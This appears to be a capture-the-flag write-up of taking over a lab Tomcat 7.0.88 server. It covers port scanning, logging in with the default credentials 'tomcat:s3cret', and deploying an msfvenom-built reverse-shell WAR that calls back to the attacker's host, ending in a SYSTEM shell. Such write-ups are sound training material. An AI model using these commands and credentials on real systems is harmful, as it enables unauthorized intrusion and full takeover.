1,Recon
port scan
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
```
By search this version of `Apache Tomcat`
```
searchsploit Apache Tomcat 7.0.88
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47  | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47  | windows/webapps/42953.txt
---------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I think it would be a path to check that.
But unluckily, it would not our target.
By checking the error page, we can get the default credit
![](images/Pasted%20image%2020241216011559.png)

By using the default credit `tomcat:s3cret`
![](images/Pasted%20image%2020241216011215.png)
We can get the version of system `Windows Server 2012 R2`, so I think we can use some kernel vulners here, but it would not be our first choice.

![](images/Pasted%20image%2020241216012033.png)
In this page, I want to go to the `/host-manager` page, but the default user access denied.
But in  the bottom of this page, we can deploy a war file here.
![](images/Pasted%20image%2020241216012258.png)

I’ll use `msfvenon` to create a windows reverse shell that can be caught with nc:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.8 LPORT=443 -f war > rev_shell.war`

I’ll also need to know the name of the jsp page to activate it with curl. I’ll use jar to list the contents of the war.
```
jar -ft rev_shell.war     
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
META-INF/
META-INF/MANIFEST.MF
WEB-INF/
WEB-INF/web.xml
qskeomvjakwawpb.jsp
```

Then we just open nc and handle it.
`curl http://10.10.10.95:8080/rev_shell/qskeomvjakwawpb.jsp`

When we get the shell
```
whoami
nt authority\system
```
We found it was SYSYEM user.
